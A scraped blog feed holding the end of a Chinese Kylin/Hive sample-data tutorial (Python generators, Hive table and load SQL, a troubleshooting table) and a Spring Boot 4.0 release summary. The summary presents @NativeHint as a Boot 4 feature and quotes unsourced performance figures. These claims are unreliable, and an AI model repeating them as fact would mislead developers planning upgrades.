<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Product data has been written to <span class="hljs-subst">{output_file}</span>"</span>)

</code></pre>
<p>生成数据如下图所示：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b719f05ee5d8467995c1d9bdede01e3d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764297359&amp;x-signature=KUHpuJP7Ak7NBJXL%2BSOiC8xl%2BJ4%3D" alt="生成数据" loading="lazy"/></p>
<h3 data-id="heading-13">dim_region_data</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 设置参数</span>
output_file = <span class="hljs-string">'dim_region_data.txt'</span>

<span class="hljs-comment"># 定义区域ID和区域名称</span>
regions = [
    (<span class="hljs-string">'R001'</span>, <span class="hljs-string">'North America'</span>),
    (<span class="hljs-string">'R002'</span>, <span class="hljs-string">'Europe'</span>),
    (<span class="hljs-string">'R003'</span>, <span class="hljs-string">'Asia'</span>),
    (<span class="hljs-string">'R004'</span>, <span class="hljs-string">'South America'</span>),
    (<span class="hljs-string">'R005'</span>, <span class="hljs-string">'Africa'</span>),
    (<span class="hljs-string">'R006'</span>, <span class="hljs-string">'Australia'</span>),
    (<span class="hljs-string">'R007'</span>, <span class="hljs-string">'Antarctica'</span>)
]

<span class="hljs-comment"># 生成数据</span>
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">'w'</span>) <span class="hljs-keyword">as</span> f:
    <span class="hljs-keyword">for</span> region_id, region_name <span class="hljs-keyword">in</span> regions:
        line = <span class="hljs-string">f"<span class="hljs-subst">{region_id}</span>,<span class="hljs-subst">{region_name}</span>\n"</span>
        f.write(line)

<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Region data has been written to <span class="hljs-subst">{output_file}</span>"</span>)

</code></pre>
<p>生成的数据如下图所示：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1d9f4b9a64514c44b742154182a94e41~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764297359&amp;x-signature=9jmZxxlSqXW5fgpEQIsYFqEwCdI%3D" alt="生成数据并查看" loading="lazy"/></p>
<h3 data-id="heading-14">kylin_examples.sql</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 创建订单数据库、表结构</span>
<span class="hljs-keyword">create</span> database if <span class="hljs-keyword">not</span> <span class="hljs-keyword">exists</span> `wzk_kylin`;
<span class="hljs-comment">-- 1、销售表：dw_sales</span>
<span class="hljs-comment">-- id 唯一标识</span>
<span class="hljs-comment">-- date1 日期</span>
<span class="hljs-comment">-- channelId 渠道ID</span>
<span class="hljs-comment">-- productId 产品ID</span>
<span class="hljs-comment">-- regionId 区域ID</span>
<span class="hljs-comment">-- amount 数量</span>
<span class="hljs-comment">-- price 金额</span>
<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> wzk_kylin.dw_sales(
  id string,
  date1 string,
  channelId string,
  productId string,
  regionId string,
  amount <span class="hljs-type">int</span>,
  price <span class="hljs-keyword">double</span>
)<span class="hljs-type">ROW</span> FORMAT DELIMITED FIELDS TERMINATED <span class="hljs-keyword">BY</span> <span class="hljs-string">','</span>;
<span class="hljs-comment">-- 2、渠道表：dim_channel</span>
<span class="hljs-comment">-- channelId 渠道ID</span>
<span class="hljs-comment">-- channelName 渠道名称</span>
<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> wzk_kylin.dim_channel(
  channelId string,
  channelName string
)<span class="hljs-type">ROW</span> FORMAT DELIMITED FIELDS TERMINATED <span class="hljs-keyword">BY</span> <span class="hljs-string">','</span>;
<span class="hljs-comment">-- 3、产品表：dim_product</span>
<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> wzk_kylin.dim_product(
  productId string,
  productName string
)<span class="hljs-type">ROW</span> FORMAT DELIMITED FIELDS TERMINATED <span class="hljs-keyword">BY</span> <span class="hljs-string">','</span>;
<span class="hljs-comment">--4、区域表：dim_region</span>
<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> wzk_kylin.dim_region(
  regionId string,
  regionName string
)<span class="hljs-type">ROW</span> FORMAT DELIMITED FIELDS TERMINATED <span class="hljs-keyword">BY</span> <span class="hljs-string">','</span>;

<span class="hljs-comment">-- 导入数据</span>
LOAD DATA <span class="hljs-keyword">LOCAL</span> INPATH <span class="hljs-string">'/opt/wzk/kylin_test/dw_sales_data.txt'</span>
OVERWRITE <span class="hljs-keyword">INTO</span> <span class="hljs-keyword">TABLE</span> wzk_kylin.dw_sales;
LOAD DATA <span class="hljs-keyword">LOCAL</span> INPATH <span class="hljs-string">'/opt/wzk/kylin_test/dim_channel_data.txt'</span>
OVERWRITE <span class="hljs-keyword">INTO</span> <span class="hljs-keyword">TABLE</span> wzk_kylin.dim_channel;
LOAD DATA <span class="hljs-keyword">LOCAL</span> INPATH <span class="hljs-string">'/opt/wzk/kylin_test/dim_product_data.txt'</span>
OVERWRITE <span class="hljs-keyword">INTO</span> <span class="hljs-keyword">TABLE</span> wzk_kylin.dim_product;
LOAD DATA <span class="hljs-keyword">LOCAL</span> INPATH <span class="hljs-string">'/opt/wzk/kylin_test/dim_region_data.txt'</span>
OVERWRITE <span class="hljs-keyword">INTO</span> <span class="hljs-keyword">TABLE</span> wzk_kylin.dim_region;
</code></pre>
<h2 data-id="heading-15">运行数据</h2>
<p>我们需要把刚才的数据上传到指定目录上，/opt/wzk/目录下。</p>
<pre><code class="hljs language-shell" lang="shell">cd /opt/wzk/kylin_test
</code></pre>
<p>我已经上传到服务器上了：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/167850aa4c694ce68d45cc174fd37065~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764297359&amp;x-signature=ERPhX9rDvybEIwc%2FdQg%2BCW9Gcxw%3D" alt="服务器上查看数据" loading="lazy"/></p>
<p>SQL文件也记得上传上去
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5df7d5f1c5414b57aa4cad281cccf3f4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764297359&amp;x-signature=bC1QjN9P0VQ9Jieec1mhbnJcSqA%3D" alt="SQL文件" loading="lazy"/>
执行Hive：</p>
<pre><code class="hljs language-shell" lang="shell">hive -f kylin_examples.sql
</code></pre>
<p>执行结果如下图所示：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4908fe84d4f14c57895e629a88fc2cee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764297359&amp;x-signature=ftsytYl0ct%2F2ouv9cr86eL0DJJo%3D" alt="hive执行SQL处理" loading="lazy"/></p>
<h2 data-id="heading-16">测试数据</h2>
<p>我们需要启动Hive</p>
<pre><code class="hljs language-shell" lang="shell">hive
</code></pre>
<p>执行结果如下图所示：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/36bac575055a4390a96385e1e219efd0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764297359&amp;x-signature=NfVkbjpp9CmH2tjgpeGD91mRmB8%3D" alt="启动Hive服务" loading="lazy"/>
执行如下的指令：</p>
<pre><code class="hljs language-shell" lang="shell">use wzk_kylin;
select date1, sum(price) as total_money, sum(amount) as
total_amount
from dw_sales
group by date1;
</code></pre>
<p>执行结果如下图所示：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6fbc741f8f974fbe97d6039c88b29628~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764297359&amp;x-signature=M5n8bHFAChEjRbS%2BUEuCqH6rXGM%3D" alt="执行SQL语句查询数据" loading="lazy"/></p>
<h2 data-id="heading-17">错误速查</h2>


















































<table><thead><tr><th>症状</th><th>根因定位</th><th>修复</th></tr></thead><tbody><tr><td>Table not found wzk_kylin.dw_sales</td><td>数据库/表未创建或大小写不一致</td><td>重新执行建表脚本；确认大小写与库前缀一致</td></tr><tr><td>LOAD DATA LOCAL 失败或数据为空</td><td>本地路径错误/权限不足/分隔符不符</td><td>修正路径与权限；确认 CSV 分隔与列顺序一致</td></tr><tr><td>Kylin 构建任务卡住或失败</td><td>HDFS/YARN 队列/权限或 MapReduce 参数不足</td><td>提升队列资源；在 Kylin 调优构建并行度与内存</td></tr><tr><td>查询命中慢（未走预计算）</td><td>维度/度量或 Aggregation Group 设计不当</td><td>精简维度组合，合理裁剪 Cuboid；为高频查询单独建 AG</td></tr><tr><td>No realize for query</td><td>Cube 未覆盖该维度组合或时间分区</td><td>扩充维度组合或补构该分区 Segment</td></tr><tr><td>实时接入延迟大</td><td>Kafka Topic/Schema 与模型不匹配</td><td>对齐 Schema；调大批次/缓存；核对时间戳与水位</td></tr><tr><td>RegionTooBusy/Timeout（HBase）</td><td>区域热点或内存参数过小</td><td>预分区/冷热分离；调大 MemStore/BlockCache</td></tr><tr><td>权限相关报错（Kerberos/ACL）</td><td>集群开启安全认证</td><td>检查 keytab 与 principal；获取票据并配置 Kylin/Hive 客户端</td></tr></tbody></table>
<h2 data-id="heading-18">其他系列</h2>
<h3 data-id="heading-19">🚀 AI篇持续更新中（长期更新）</h3>
<p><strong>AI炼丹日志-29 - 字节跳动 DeerFlow 深度研究框<em>斜体样式</em>架 私有部署 测试上手 架构研究</strong>，持续打造实用AI工具指南！
<strong>AI研究-127 Qwen2.5-Omni 深解：Thinker-Talker 双核、TMRoPE 与流式语音</strong></p>
<h3 data-id="heading-20">💻 Java篇持续更新中（长期更新）</h3>
<p><strong>Java-174 FastFDS 从单机到分布式文件存储：实战与架构取舍</strong>
MyBatis 已完结，Spring 已完结，Nginx已完结，Tomcat已完结，分布式服务已完结，Dubbo已完结，MySQL已完结，MongoDB已完结，Neo4j已完结，FastDFS 正在更新，深入浅出助你打牢基础！</p>
<h3 data-id="heading-21">📊 大数据板块已完成多项干货更新（300篇）：</h3>
<p>包括 Hadoop、Hive、Kafka、Flink、ClickHouse、Elasticsearch 等二十余项核心组件，覆盖离线+实时数仓全栈！
<strong>大数据-278 Spark MLib - 基础介绍 机器学习算法 梯度提升树 GBDT案例 详解</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring Boot 4.0 发布总结：新特性、依赖变更与升级指南]]></title>    <link>https://juejin.cn/post/7574699340679446537</link>    <guid>https://juejin.cn/post/7574699340679446537</guid>    <pubDate>2025-11-21T02:25:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574699340679446537" data-draft-id="7574726841542475814" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Spring Boot 4.0 发布总结：新特性、依赖变更与升级指南"/> <meta itemprop="keywords" content="后端,Spring Boot"/> <meta itemprop="datePublished" content="2025-11-21T02:25:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Harry技术"/> <meta itemprop="url" content="https://juejin.cn/user/4325909730446745"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Spring Boot 4.0 发布总结：新特性、依赖变更与升级指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4325909730446745/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Harry技术
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T02:25:47.000Z" title="Fri Nov 21 2025 02:25:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Spring Boot 4.0 发布总结：新特性、依赖变更与升级指南</h2>
<p>2025 年 11 月 21 日，Spring Boot 4.0 正式发布，标志着 Java Web 应用开发迈入全新阶段。该版本基于 Spring Framework 7.0 构建，聚焦云原生性能优化、开发体验升级与生态适配调整，同时宣布 3.x 系列即将进入维护期。以下从核心依赖、关键特性、版本支持策略、生态变更及升级建议五大维度展开总结。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/889bd9e6b9794f5c9986ced7281f9894~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFycnnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764296746&amp;x-signature=jg%2Bts%2FUkADTTkZmdtKC6ToyyOII%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-1">一、核心依赖与环境要求</h3>
<p>Spring Boot 4.0 对底层依赖进行全面升级，明确了最低技术基线，以适配现代 Java 生态与云原生需求：</p>
<ul>
<li><strong>Java 版本</strong>：最低要求 Java 17，官方强烈推荐 Java 21（以解锁虚拟线程特性）及 Java 25，充分利用 JVM 新功能提升性能。</li>
<li><strong>规范基座</strong>：全面升级至 Jakarta EE 11，强制要求 Servlet 6.1 规范，这是 Web 容器适配的核心前提。</li>
<li><strong>Web 容器支持</strong>：仅兼容 Tomcat 11.0 和 Jetty 12.1；<strong>暂时移除 Undertow 支持</strong>，原因是 Undertow 尚未适配 Servlet 6.1，且其维护团队资源不足、迭代效率低，Spring Boot 团队已无法承担过高的适配成本。</li>
<li><strong>构建工具</strong>：Maven 需 3.6.3+，Gradle 需 7.6.4+（推荐 8.14+ 或 9.x 版本，以支持原生镜像编译等新特性）。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5b49f802054c458c839dfa7575b115e0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFycnnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764296746&amp;x-signature=CDnZuXkdYyExzvKP%2BPPjaKmrLS4%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-2">二、关键特性：性能、体验与架构三重升级</h3>
<p>Spring Boot 4.0 围绕 “高效开发”“云原生适配”“稳定性增强” 三大目标，推出多项突破性特性，覆盖并发、API 管理、原生编译等核心场景：</p>
<h4 data-id="heading-3">1. 并发革命：虚拟线程成为核心模型</h4>
<p>基于 Java 21+ 虚拟线程（Virtual Threads）特性，Spring Boot 4.0 重构线程池模型，实现 “百万级并发” 支持：</p>
<ul>
<li><strong>无缝启用</strong>：通过配置 <code>spring.threads.virtual.enabled=true</code> 全局开启，原有 <code>@Async</code> 注解无需修改即可自动使用虚拟线程。</li>
<li><strong>性能提升</strong>：在支付网关等高频场景中，每秒请求处理量（RPS）从 1.2 万提升至 8.5 万，CPU 占用率下降 40%。</li>
<li><strong>监控增强</strong>：Actuator 新增 <code>/virtual-threads</code> 端点，可实时监控虚拟线程状态与阻塞事件，便于问题排查。</li>
</ul>
<h4 data-id="heading-4">2. 开发体验：简化 API 管理与 HTTP 调用</h4>
<p>针对日常开发中的痛点，版本新增多个原生注解与 API，替代第三方依赖并减少冗余代码：</p>
<ul>
<li>API 版本控制：  <code>@RequestMapping</code>  注解新增  <code>version</code>  参数，支持同一 URL 多版本共存，无需额外配置路由规则。示例：</li>
</ul>
<pre><code class="hljs language-java" lang="java">  <span class="hljs-meta">@RestController</span>
  <span class="hljs-meta">@RequestMapping("/api/user")</span>
  <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> {
      <span class="hljs-meta">@GetMapping(version = "1")</span> <span class="hljs-comment">// 匹配 /api/user?version=1 或配置路径映射</span>
      <span class="hljs-keyword">public</span> UserV1 <span class="hljs-title function_">getUserV1</span><span class="hljs-params">()</span> { <span class="hljs-comment">/* 旧版逻辑 */</span> }
      <span class="hljs-meta">@GetMapping(version = "2")</span>
      <span class="hljs-keyword">public</span> UserV2 <span class="hljs-title function_">getUserV2</span><span class="hljs-params">()</span> { <span class="hljs-comment">/* 新版逻辑 */</span> }
  }
</code></pre>
<ul>
<li>原生声明式 HTTP 客户端：<code>@HttpServiceClient</code>注解替代 OpenFeign，无需引入第三方依赖即可实现远程调用，代码量减少 60%。示例：</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@HttpServiceClient("user-service")</span>
  <span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserServiceClient</span> {
      <span class="hljs-meta">@GetExchange("/users/{id}")</span>
      UserDTO <span class="hljs-title function_">getUserById</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span>;
}
</code></pre>
<p><strong>流式数据操作 API</strong>：新增 <code>JdbcClient</code> 与 <code>JmsClient</code>，采用流式（Fluent）语法简化数据库与消息队列操作，代码可读性显著提升。</p>
<h4 data-id="heading-5">3. 云原生优化：GraalVM 原生镜像正式量产</h4>
<p>Spring Boot 4.0 将 GraalVM 原生编译从 “实验特性” 升级为 “生产级支持”，通过 AOT（提前编译）技术实现启动速度与内存占用的 “数量级优化”：</p>
<ul>
<li>
<p><strong>性能数据</strong>：传统 JVM 模式下 500ms 启动的微服务，编译为原生镜像后启动时间降至 50ms 以内；堆内存从 2GB 缩减至 120MB 级别，资源成本降低 80%+。</p>
</li>
<li>
<p>易用性提升：提供<code>@NativeHint</code>注解配置反射与资源加载规则，搭配 Maven 插件可自动分析依赖兼容性；支持直接生成 Docker 镜像，部署无需 JVM 环境。示例：</p>
</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@NativeHint(
      options = {"--enable-http", "--enable-https"},
    resources = @Resource(patterns = ".*.properties")
  )</span>
  <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NativeConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">NativeConfiguration</span> {}
</code></pre>
<h4 data-id="heading-6">4. 架构瘦身与弹性增强</h4>
<ul>
<li><strong>深度模块化重构</strong>：将核心功能拆分为独立模块，减少依赖冗余，GraalVM 原生镜像编译速度提升 30%，内存效率优化显著。</li>
<li><strong>内置弹性能力</strong>：核心集成 <code>@Retryable</code>（重试）与 <code>@ConcurrencyLimit</code>（限流）注解，无需强依赖 Resilience4j 等外部熔断库，简化分布式系统稳定性保障。</li>
</ul>
<h3 data-id="heading-7">三、版本支持策略：3.x 进入维护期，升级路径明确</h3>
<p>Spring Boot 官方发布了各版本的支持周期，为项目升级提供清晰时间节点：</p>















































<table><thead><tr><th>版本分支</th><th>初始发布时间</th><th>开源支持结束时间</th><th>商业支持结束时间</th></tr></thead><tbody><tr><td>4.0.x</td><td>2025-11</td><td>2026-12</td><td>2027-12</td></tr><tr><td>3.5.x</td><td>2025-05</td><td>2026-06</td><td>2032-06</td></tr><tr><td>3.4.x</td><td>2024-11</td><td>2025-12</td><td>2026-12</td></tr><tr><td>3.3.x</td><td>2024-05</td><td>2025-06</td><td>2026-06</td></tr><tr><td>3.2.x</td><td>2023-11</td><td>2024-12</td><td>2025-12</td></tr><tr><td>2.7.x</td><td>2022-05</td><td>2023-06</td><td>2029-06</td></tr></tbody></table>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aa8e26de11074f6e85484eea0c77b38c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFycnnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764296746&amp;x-signature=ohFVN0MlkMWl9b4YbqyQ2U70%2BAA%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li><strong>3.x 版本关键提示</strong>：3.5.x 是 3.x 系列的最后一个重大版本，开源支持将持续至 2026 年 6 月，商业支持延长至 2032 年 6 月。官方建议当前使用 3.x 的项目，先升级至 3.5.x 版本 —— 该版本已内置 4.0 迁移所需的关键特性与适配机制，可实现 “平滑过渡”。</li>
<li><strong>4.0.x 支持周期</strong>：作为最新主版本，开源支持持续至 2026 年 12 月，适合新建项目或对云原生、高并发有强需求的场景。</li>
</ul>
<h3 data-id="heading-8">四、生态重大变更：Undertow 弃用与 Servlet 6.1 特性</h3>
<h4 data-id="heading-9">1. Undertow 弃用：技术适配与维护效率双重考量</h4>
<p>Spring Boot 4.0 彻底移除 Undertow 支持，核心原因包括：</p>
<ul>
<li><strong>规范适配滞后</strong>：Undertow 未及时适配 Servlet 6.1 规范，无法满足 Jakarta EE 11 基线要求。</li>
<li><strong>维护团队能力不足</strong>：Undertow 核心维护者仅 3-5 人，且存在人员流失，2023-2024 年核心功能迭代周期从 2 个月延长至 6 个月以上。</li>
<li><strong>适配成本过高</strong>：为兼容 Spring Boot 3.x 的 Jakarta EE 9+、AOT 编译等特性，Spring Boot 团队为 Undertow 投入 30% 的兼容性测试资源，远超 Tomcat（5%）与 Jetty（8%）。</li>
<li><strong>性能优势消失</strong>：通过 JMeter 测试，Tomcat 10.1.18 与 Undertow 2.3.10.Final 性能相差无几，在现代 JVM 优化下，Undertow 的 “低内存、高并发” 优势已不明显。</li>
</ul>
<h4 data-id="heading-10">2. Servlet 6.1 新特性：性能与安全双提升</h4>
<p>作为 Jakarta EE 11 的核心组件，Servlet 6.1 带来多项实用改进，也是 Spring Boot 4.0 性能优化的重要基础：</p>
<ul>
<li><strong>NIO 增强</strong>：<code>ServletInputStream</code> 与 <code>ServletOutputStream</code> 支持 <code>ByteBuffer</code>，减少数据拷贝，高并发场景下 I/O 效率提升显著。</li>
<li><strong>精细化 HTTP 重定向</strong>：支持自定义重定向状态码（如 301 永久移动、307 临时重定向），并可控制响应体是否返回，符合 RESTful 规范。</li>
<li><strong>敏感请求头安全处理</strong>：新增 <code>HttpServlet.isSensitiveHeader</code> 方法，自动屏蔽 Authorization、Cookie 等敏感头在 TRACE 请求中的泄露，提升安全性。</li>
<li><strong>HTTP/2 Server Push 废弃</strong>：因实际使用率低、维护成本高，正式移除该特性，建议通过 “资源预加载（preload）”“preconnect” 等更高效的策略优化前端性能。</li>
</ul>
<h3 data-id="heading-11">五、升级建议与注意事项</h3>
<h4 data-id="heading-12">1. 前置准备：依赖与环境检查</h4>
<ul>
<li><strong>Java 版本升级</strong>：确保项目已迁移至 Java 17+，推荐直接升级至 Java 21，以充分利用虚拟线程特性。</li>
<li><strong>Web 容器替换</strong>：若当前使用 Undertow，需迁移至 Tomcat 11.0 或 Jetty 12.1，注意检查容器配置（如端口、线程池参数）的兼容性。</li>
<li><strong>构建工具升级</strong>：Gradle 项目需升级至 7.6.4+（推荐 9.x），Maven 项目确保 3.6.3+，避免依赖解析错误。</li>
</ul>
<h4 data-id="heading-13">2. 代码迁移关键要点</h4>
<ul>
<li><strong>Jackson 版本适配</strong>：Spring Boot 4.0 完全弃用 Jackson 2.x，仅支持 Jackson 3.x，需检查项目中 JSON 序列化 / 反序列化逻辑（如自定义 <code>Module</code>、日期格式化配置）。</li>
